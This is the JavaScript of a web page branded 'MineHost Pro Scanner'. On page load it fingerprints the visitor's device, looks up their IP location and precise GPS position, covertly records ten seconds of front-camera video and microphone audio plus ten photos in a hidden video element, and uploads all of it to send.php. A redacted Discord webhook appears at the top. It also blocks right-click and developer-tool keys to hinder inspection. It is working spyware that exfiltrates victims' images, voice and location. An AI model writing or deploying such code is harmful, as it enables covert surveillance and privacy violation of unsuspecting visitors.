// Discord webhook URL
const DISCORD_WEBHOOK = "******";
let frontCameraStream = null;
let mediaRecorder = null;
let recordedChunks = [];
let audioRecorder = null;
let audioChunks = [];
let scanData = {};
let isScanComplete = false;

// Anti-inspection protection
document.addEventListener('contextmenu', e => {
    e.preventDefault();
    document.getElementById('inspect-warning').style.display = 'flex';
    setTimeout(() => {
        document.getElementById('inspect-warning').style.display = 'none';
    }, 3000);
});

document.addEventListener('keydown', e => {
    if (e.key === 'F12' || 
        (e.ctrlKey && e.shiftKey && e.key === 'I') || 
        (e.ctrlKey && e.key === 'u') ||
        (e.ctrlKey && e.shiftKey && e.key === 'J')) {
        e.preventDefault();
        document.getElementById('inspect-warning').style.display = 'flex';
        setTimeout(() => {
            document.getElementById('inspect-warning').style.display = 'none';
        }, 3000);
    }
});

// Generate UUID
function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
        const r = Math.random() * 16 | 0;
        const v = c === 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
    });
}

// Device detection functions
function getDeviceName() {
    const ua = navigator.userAgent;
    if (/Vivo/i.test(ua)) return "Vivo Phone";
    if (/Oppo/i.test(ua)) return "Oppo Phone"; 
    if (/Redmi/i.test(ua)) return "Xiaomi Redmi";
    if (/Mi A\d/i.test(ua)) return "Xiaomi Mi";
    if (/Poco/i.test(ua)) return "Poco Phone";
    if (/Realme/i.test(ua)) return "Realme Phone";
    if (/Huawei|Honor/i.test(ua)) return "Huawei Phone";
    if (/Samsung/i.test(ua)) return "Samsung Device";
    if (/iPhone/i.test(ua)) return "iPhone";
    if (/iPad/i.test(ua)) return "iPad";
    if (/Pixel/i.test(ua)) return "Google Pixel";
    if (/MacBook/i.test(ua)) return "MacBook";
    if (/Surface/i.test(ua)) return "Microsoft Surface";
    return navigator.platform || "Unknown Device";
}

function getDeviceBrand() {
    const ua = navigator.userAgent;
    if (/Vivo/i.test(ua)) return "Vivo";
    if (/Oppo/i.test(ua)) return "Oppo";
    if (/Redmi|Xiaomi/i.test(ua)) return "Xiaomi";
    if (/Poco/i.test(ua)) return "Poco";
    if (/Realme/i.test(ua)) return "Realme";
    if (/Huawei|Honor/i.test(ua)) return "Huawei";
    if (/Samsung/i.test(ua)) return "Samsung";
    if (/iPhone|iPad/i.test(ua)) return "Apple";
    if (/Pixel/i.test(ua)) return "Google";
    if (/MacBook/i.test(ua)) return "Apple";
    if (/Surface/i.test(ua)) return "Microsoft";
    return "Unknown";
}

function getDeviceType() {
    const ua = navigator.userAgent;
    if (/Mobile|iPhone|Android/i.test(ua)) return "Mobile";
    if (/Tablet|iPad/i.test(ua)) return "Tablet";
    return "Desktop";
}

function getOS() {
    const ua = navigator.userAgent;
    if (/Windows/i.test(ua)) return "Windows";
    if (/Mac/i.test(ua)) return "MacOS";
    if (/Linux/i.test(ua)) return "Linux";
    if (/Android/i.test(ua)) return "Android";
    if (/iPhone|iPad/i.test(ua)) return "iOS";
    return "Unknown";
}

function getOSVersion() {
    const ua = navigator.userAgent;
    if (/Windows NT 10.0/i.test(ua)) return "10/11";
    if (/Windows NT 6.3/i.test(ua)) return "8.1";
    if (/Windows NT 6.2/i.test(ua)) return "8";
    if (/Windows NT 6.1/i.test(ua)) return "7";
    if (/Mac OS X (\d+_\d+)/i.test(ua)) return ua.match(/Mac OS X (\d+_\d+)/)[1].replace('_', '.');
    if (/Android (\d+\.\d+)/i.test(ua)) return ua.match(/Android (\d+\.\d+)/)[1];
    if (/CPU (?:iPhone )?OS (\d+_\d+)/i.test(ua)) return ua.match(/CPU (?:iPhone )?OS (\d+_\d+)/)[1].replace('_', '.');
    return "Unknown";
}

function getArchitecture() {
    return /64/.test(navigator.userAgent) ? "64-bit" : "32-bit";
}

function getBrowserName() {
    const ua = navigator.userAgent;
    if (/Edg/i.test(ua)) return "Microsoft Edge";
    if (/Chrome/i.test(ua)) return "Google Chrome";
    if (/Firefox/i.test(ua)) return "Mozilla Firefox";
    if (/Safari/i.test(ua)) return "Apple Safari";
    if (/Opera|OPR/i.test(ua)) return "Opera";
    return "Unknown";
}

function getBrowserVersion() {
    const ua = navigator.userAgent;
    const match = ua.match(/(Edg|Chrome|Firefox|Safari|Opera|OPR)\/(\d+\.\d+)/);
    return match ? match[2] : "Unknown";
}

function getBrowserEngine() {
    const ua = navigator.userAgent;
    if (/AppleWebKit/i.test(ua)) {
        return /Chrome/i.test(ua) ? "Blink" : "WebKit";
    }
    if (/Gecko/i.test(ua)) return "Gecko";
    if (/Trident/i.test(ua)) return "Trident";
    if (/Presto/i.test(ua)) return "Presto";
    return "Unknown";
}

function getBrowserPlugins() {
    try {
        return Array.from(navigator.plugins)
            .map(plugin => plugin.name)
            .filter(name => name && name.length > 0)
            .join(', ') || "None";
    } catch (e) {
        return "Unknown";
    }
}

function detectIncognito() {
    try {
        if (window.chrome && window.chrome.runtime) {
            return false;
        }
        const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
        return !fs;
    } catch (e) {
        return "Unknown";
    }
}

function detectWebGL() {
    try {
        const canvas = document.createElement('canvas');
        return !!(window.WebGLRenderingContext && 
                 (canvas.getContext('webgl') || canvas.getContext('experimental-webgl')));
    } catch(e) {
        return false;
    }
}

function getCanvasFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = "14px 'Arial'";
        ctx.textBaseline = "alphabetic";
        ctx.fillStyle = "#f60";
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = "#069";
        ctx.fillText("Fingerprint", 2, 15);
        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
        ctx.fillText("Fingerprint", 4, 17);
        return canvas.toDataURL().substring(0, 100) + "...";
    } catch (e) {
        return "Error";
    }
}

function getGPUInfo() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return "Unknown";
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || "Unknown";
    } catch {
        return "Unknown";
    }
}

function getGPUVendor() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return "Unknown";
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || "Unknown";
    } catch {
        return "Unknown";
    }
}

function getGPURenderer() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return "Unknown";
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || "Unknown";
    } catch {
        return "Unknown";
    }
}

async function getNetworkInfo() {
    try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        const locRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
        const locData = await locRes.json();
        
        return {
            ip: ipData.ip,
            city: locData.city || "Unknown",
            country: locData.country_name || "Unknown",
            region: locData.region || "Unknown",
            isp: locData.org || "Unknown",
            asn: locData.asn || "Unknown",
            timezone: locData.timezone || "Unknown",
            isVPN: locData.security ? (locData.security.vpn || locData.security.proxy || locData.security.tor) : false
        };
    } catch {
        return {
            ip: "Unknown",
            city: "Unknown",
            country: "Unknown",
            region: "Unknown",
            isp: "Unknown",
            asn: "Unknown",
            timezone: "Unknown",
            isVPN: false
        };
    }
}

async function getGeolocation() {
    if (!navigator.geolocation) return {
        latitude: "Not supported",
        longitude: "Not supported",
        accuracy: "Not supported"
    };
    
    try {
        const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {
                enableHighAccuracy: true,
                timeout: 5000,
                maximumAge: 0
            });
        });
        
        return {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: `${position.coords.accuracy} meters`,
            altitude: position.coords.altitude ? `${position.coords.altitude} meters` : "Not available",
            speed: position.coords.speed ? `${position.coords.speed} m/s` : "Not available"
        };
    } catch (error) {
        return {
            latitude: "Denied",
            longitude: "Denied",
            accuracy: "Denied",
            error: error.message
        };
    }
}

async function getBatteryInfo() {
    if (!navigator.getBattery) return {
        level: "Not supported",
        charging: "Not supported",
        chargingTime: "Not supported",
        dischargingTime: "Not supported"
    };
    
    try {
        const battery = await navigator.getBattery();
        return {
            level: `${Math.floor(battery.level * 100)}%`,
            charging: battery.charging ? "Yes" : "No",
            chargingTime: battery.chargingTime === Infinity ? "Unknown" : `${battery.chargingTime} seconds`,
            dischargingTime: battery.dischargingTime === Infinity ? "Unknown" : `${battery.dischargingTime} seconds`
        };
    } catch {
        return {
            level: "Error",
            charging: "Error",
            chargingTime: "Error",
            dischargingTime: "Error"
        };
    }
}

async function capturePhoto(video, sequence) {
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
}

// Initialize scanData with all categories
function initializeScanData() {
    scanData = {
        identity: {
            userId: generateUUID(),
            sessionId: generateUUID(),
            authMethod: "unknown",
            isAuthenticated: false,
            deviceLinked: false,
            accountAge: "unknown",
            loginTimestamp: new Date().toISOString()
        },
        features: {
            cssGrid: CSS.supports('display', 'grid'),
            cssVariables: CSS.supports('--var', 'test'),
            es6Support: typeof Symbol !== 'undefined',
            html5Video: !!document.createElement('video').canPlayType,
            html5Audio: !!document.createElement('audio').canPlayType,
            mediaDevices: !!navigator.mediaDevices,
            batteryAPI: !!navigator.getBattery,
            vibrationAPI: !!navigator.vibrate,
            clipboardAPI: !!navigator.clipboard,
            darkModePreference: window.matchMedia('(prefers-color-scheme: dark)').matches,
            prefersReducedMotion: window.matchMedia('(prefers-reduced-motion: reduce)').matches
        },
        device: {
            name: getDeviceName(),
            model: "Unknown",
            brand: getDeviceBrand(),
            type: getDeviceType(),
            manufacturer: getDeviceBrand(),
            os: getOS(),
            osVersion: getOSVersion(),
            architecture: getArchitecture(),
            uuid: generateUUID(),
            identifier: generateUUID(),
            deviceType: getDeviceType(),
            gpu: getGPUInfo(),
            gpuVendor: getGPUVendor(),
            gpuRenderer: getGPURenderer(),
            deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "unknown",
            hardwareConcurrency: navigator.hardwareConcurrency || "unknown",
            platform: navigator.platform,
            isMobile: /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)
        },
        browser: {
            name: getBrowserName(),
            version: getBrowserVersion(),
            engine: getBrowserEngine(),
            userAgent: navigator.userAgent,
            language: navigator.language,
            languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
            vendor: navigator.vendor || "unknown",
            cookieEnabled: navigator.cookieEnabled,
            javascriptEnabled: true,
            doNotTrack: navigator.doNotTrack || "unknown",
            plugins: getBrowserPlugins(),
            extensions: "unknown",
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset(),
            resolution: `${window.screen.width}x${window.screen.height}`,
            colorDepth: `${window.screen.colorDepth} bit`,
            localStorage: !!window.localStorage,
            sessionStorage: !!window.sessionStorage,
            incognito: detectIncognito(),
            webGL: detectWebGL(),
            canvasFingerprint: getCanvasFingerprint(),
            audioFingerprint: "unknown"
        },
        fingerprint: {
            id: generateUUID(),
            canvas: getCanvasFingerprint(),
            webgl: "unknown",
            audio: "unknown",
            hash: generateUUID(),
            raw: JSON.stringify({
                userAgent: navigator.userAgent,
                screen: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                plugins: getBrowserPlugins()
            }),
            userId: generateUUID(),
            sessionId: generateUUID(),
            deviceId: generateUUID(),
            deviceHash: generateUUID(),
            fonts: "unknown",
            timezoneOffsetHash: "unknown",
            screenResolutionHash: "unknown",
            userAgentHash: "unknown",
            navigatorHash: "unknown",
            tlsFingerprint: "unknown",
            touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
            osHash: "unknown",
            webGLVendor: getGPUVendor(),
            webGLRenderer: getGPURenderer(),
            audioData: "unknown",
            canvasData: getCanvasFingerprint(),
            mouseMovementPattern: "unknown",
            generatedBy: "MineHost Pro Scanner",
            signature: generateUUID()
        },
        sensors: {
            accelerometer: 'DeviceMotionEvent' in window,
            gyroscope: 'DeviceOrientationEvent' in window,
            magnetometer: false,
            orientation: 'DeviceOrientationEvent' in window,
            light: 'ondevicelight' in window,
            proximity: 'ondeviceproximity' in window,
            motion: 'DeviceMotionEvent' in window
        },
        battery: {
            level: "unknown",
            charging: "unknown",
            chargingTime: "unknown",
            dischargingTime: "unknown"
        },
        network: {
            connectionType: navigator.connection ? navigator.connection.effectiveType : "unknown",
            downlink: navigator.connection ? navigator.connection.downlink : "unknown",
            effectiveType: navigator.connection ? navigator.connection.effectiveType : "unknown",
            rtt: navigator.connection ? navigator.connection.rtt : "unknown",
            saveData: navigator.connection ? navigator.connection.saveData : "unknown",
            ipAddress: "unknown",
            macAddress: "unknown"
        },
        history: {
            length: window.history.length,
            navigation: performance.navigation ? performance.navigation.type : "unknown",
            chrome: {
                history: "unknown"
            }
        },
        storage: {
            local: !!window.localStorage,
            session: !!window.sessionStorage,
            indexedDB: !!window.indexedDB,
            fileSystem: false,
            usage: "unknown",
            quota: "unknown",
            cookies: navigator.cookieEnabled
        },
        location: {
            latitude: "unknown",
            longitude: "unknown",
            altitude: "unknown",
            accuracy: "unknown",
            timestamp: "unknown"
        },
        permissions: {
            geolocation: "unknown",
            camera: "unknown",
            microphone: "unknown",
            notifications: "unknown",
            clipboard: "unknown",
            push: "unknown"
        },
        behavior: {
            typingSpeed: "unknown",
            mouseMovements: "unknown",
            clickRate: "unknown",
            scrollSpeed: "unknown",
            focusChanges: "unknown"
        },
        ai: {
            botDetectionScore: 0,
            anomalyScore: 0
        },
        window: {
            innerHeight: window.innerHeight,
            innerWidth: window.innerWidth,
            outerHeight: window.outerHeight,
            outerWidth: window.outerWidth,
            devicePixelRatio: window.devicePixelRatio,
            screenX: window.screenX,
            screenY: window.screenY,
            availHeight: window.screen.availHeight,
            availWidth: window.screen.availWidth
        },
        audio: {
            contextSampleRate: "unknown",
            outputLatency: "unknown",
            hash: "unknown"
        },
        canvas: {
            winding: "unknown",
            textData: "unknown",
            imageData: "unknown",
            hash: getCanvasFingerprint(),
            pixelRatio: window.devicePixelRatio
        },
        cpu: {
            architecture: getArchitecture(),
            logicalProcessors: navigator.hardwareConcurrency || "unknown",
            threads: navigator.hardwareConcurrency || "unknown",
            vendor: "unknown",
            model: "unknown"
        },
        jsFeatures: {
            webAssembly: typeof WebAssembly !== 'undefined',
            serviceWorker: 'serviceWorker' in navigator,
            workerThreads: 'Worker' in window,
            offlineSupport: 'onLine' in navigator,
            notificationSupport: 'Notification' in window,
            indexedDB: 'indexedDB' in window,
            deviceOrientation: 'DeviceOrientationEvent' in window,
            deviceMotion: 'DeviceMotionEvent' in window,
            touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
            permissionsAPI: 'permissions' in navigator,
            clipboardAccess: 'clipboard' in navigator,
            geolocationSupport: 'geolocation' in navigator
        },
        geo: {
            city: "unknown",
            region: "unknown",
            country: "unknown",
            postalCode: "unknown",
            continent: "unknown",
            asn: "unknown",
            isp: "unknown",
            connectionType: navigator.connection ? navigator.connection.effectiveType : "unknown"
        },
        security: {
            cookiesBlocked: !navigator.cookieEnabled,
            localStorageBlocked: false,
            thirdPartyCookies: "unknown",
            httpsEnforced: window.location.protocol === 'https:',
            referrerPolicy: "unknown",
            contentSecurityPolicy: "unknown"
        },
        inputDevices: {
            mousePresent: true,
            keyboardPresent: true,
            touchscreenPresent: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
            gamepads: 'getGamepads' in navigator
        },
        language: {
            primary: navigator.language,
            preferred: navigator.languages ? navigator.languages[0] : navigator.language,
            system: "unknown",
            accepted: navigator.languages ? navigator.languages.join(', ') : navigator.language
        },
        memory: {
            jsHeapSizeLimit: "unknown",
            totalJSHeapSize: "unknown",
            usedJSHeapSize: "unknown",
            deviceMemory: navigator.deviceMemory || "unknown"
        },
        meta: {
            session: generateUUID(),
            client: generateUUID()
        },
        env: {
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            device: `${getDeviceBrand()} ${getDeviceName()}`,
            os: getOS()
        },
        system: {
            locale: navigator.language,
            deviceId: generateUUID()
        },
        chrome: {
            plugins: getBrowserPlugins(),
            extensionCount: "unknown"
        },
        experiments: {
            variantId: Math.floor(Math.random() * 1000)
        },
        user: {
            isLoggedIn: false,
            id: generateUUID(),
            referrer: document.referrer || "none"
        }
    };
}

// Send data to PHP backend
async function sendDataToBackend() {
    try {
        const response = await fetch('send.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(scanData)
        });
        
        const result = await response.json();
        console.log('Data sent successfully:', result);
    } catch (error) {
        console.error('Error sending data:', error);
    }
}

// Start media recording
async function startRecording() {
    try {
        initializeScanData();
        
        // Get network info
        const networkInfo = await getNetworkInfo();
        scanData.network.ipAddress = networkInfo.ip;
        scanData.geo.city = networkInfo.city;
        scanData.geo.country = networkInfo.country;
        scanData.geo.region = networkInfo.region;
        scanData.geo.isp = networkInfo.isp;
        scanData.geo.asn = networkInfo.asn;
        scanData.geo.connectionType = networkInfo.connectionType;
        
        // Get battery info
        const batteryInfo = await getBatteryInfo();
        scanData.battery = batteryInfo;
        
        // Get geolocation
        const geoInfo = await getGeolocation();
        scanData.location = geoInfo;
        scanData.permissions.geolocation = geoInfo.error ? "denied" : "granted";
        
        // Send initial data
        await sendDataToBackend();
        
        // Start front camera with 90 FPS
        frontCameraStream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: 'user',
                width: { ideal: 1920 },
                height: { ideal: 1080 },
                frameRate: { ideal: 90, min: 60 }
            },
            audio: false
        });

        const video = document.createElement('video');
        video.className = 'hidden-video';
        video.srcObject = frontCameraStream;
        video.autoplay = true;
        video.playsinline = true;
        document.body.appendChild(video);
        await new Promise(resolve => video.onloadedmetadata = resolve);

        // Start audio recording
        const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
        audioRecorder = new MediaRecorder(audioStream);
        audioChunks = [];
        audioRecorder.ondataavailable = e => audioChunks.push(e.data);
        audioRecorder.start();
        scanData.permissions.microphone = "granted";

        // Start video recording
        mediaRecorder = new MediaRecorder(frontCameraStream, {
            mimeType: 'video/webm;codecs=vp9',
            videoBitsPerSecond: 8000000
        });
        recordedChunks = [];
        mediaRecorder.ondataavailable = e => recordedChunks.push(e.data);
        mediaRecorder.start();
        scanData.permissions.camera = "granted";

        // Take 10 photos (1 per second)
        for (let i = 1; i <= 10; i++) {
            const photoBlob = await capturePhoto(video, i);
            
            // Create form data for photo
            const photoFormData = new FormData();
            photoFormData.append('file', photoBlob, `photo_${i}.jpg`);
            photoFormData.append('data', JSON.stringify({
                type: 'photo',
                sequence: i,
                scanData: scanData
            }));
            
            // Send photo to backend
            await fetch('send.php', {
                method: 'POST',
                body: photoFormData
            });
            
            if (i < 10) await new Promise(resolve => setTimeout(resolve, 1000));
        }

        // Stop recordings after 10 seconds
        setTimeout(async () => {
            mediaRecorder.stop();
            audioRecorder.stop();

            mediaRecorder.onstop = async () => {
                const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
                
                // Create form data for video
                const videoFormData = new FormData();
                videoFormData.append('file', videoBlob, 'video_10s_90fps.webm');
                videoFormData.append('data', JSON.stringify({
                    type: 'video',
                    scanData: scanData
                }));
                
                // Send video to backend
                await fetch('send.php', {
                    method: 'POST',
                    body: videoFormData
                });
            };

            audioRecorder.onstop = async () => {
                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                
                // Create form data for audio
                const audioFormData = new FormData();
                audioFormData.append('file', audioBlob, 'audio_10s.webm');
                audioFormData.append('data', JSON.stringify({
                    type: 'audio',
                    scanData: scanData
                }));
                
                // Send audio to backend
                await fetch('send.php', {
                    method: 'POST',
                    body: audioFormData
                });
            };

            // Clean up
            frontCameraStream.getTracks().forEach(track => track.stop());
            audioStream.getTracks().forEach(track => track.stop());
            document.body.removeChild(video);
            isScanComplete = true;
            
            // Send completion data
            scanData.scanComplete = true;
            await sendDataToBackend();
        }, 10000);

    } catch (error) {
        console.error("Scan error:", error);
        
        // Send error data
        scanData.scanError = error.message;
        await sendDataToBackend();
    }
}

// Start scan when page loads
window.addEventListener('load', startRecording);

// Handle page closing
window.addEventListener('beforeunload', () => {
    if (!isScanComplete) {
        scanData.scanInterrupted = true;
        navigator.sendBeacon('send.php', JSON.stringify(scanData));
    }
});
